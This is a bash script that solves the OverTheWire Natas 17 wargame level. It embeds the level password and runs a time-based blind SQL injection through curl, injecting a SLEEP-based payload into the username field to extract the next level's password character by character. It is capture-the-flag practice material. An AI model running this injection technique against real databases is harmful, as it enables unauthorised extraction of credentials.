#!/bin/bash
# level located on natas17.natas.labs.overthewire.org

passwordNatas17=""
defaultPasswordNatas17="EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"

echo -n "Password Natas 17 (default is ${defaultPasswordNatas17}): "
read passwordNatas17
if [ -z ${passwordNatas17} ]
then
        passwordNatas17=${defaultPasswordNatas17}
fi

secretSymbols="________________________________" # 32 symbols _
password=""

while [ ${#secretSymbols} -ne 0 ]
do
        secretSymbols=${secretSymbols:1}

        for symbol in {A..Z} {a..z} {0..9}
        do
                res=$({ time curl -s -u natas17:${passwordNatas17} http://natas17.natas.labs.overthewire.org -d username="natas18\" AND IF (password LIKE BINARY \"${password}${symbol}${secretSymbols}\", SLEEP(1), 1) -- "; } 2>&1 | grep "real")
                if [ $((${res:7:-5})) -gt 20 ]
                then
                        echo "The server isn't response"
                        exit
                elif echo $res | grep "1\....s" > /dev/null
                then
                        password="${password}${symbol}"
                        echo "${password}${secretSymbols}"
                        symbolFound=true
                        break
                fi
        done
done

echo -e "\nThe password is ${password}"
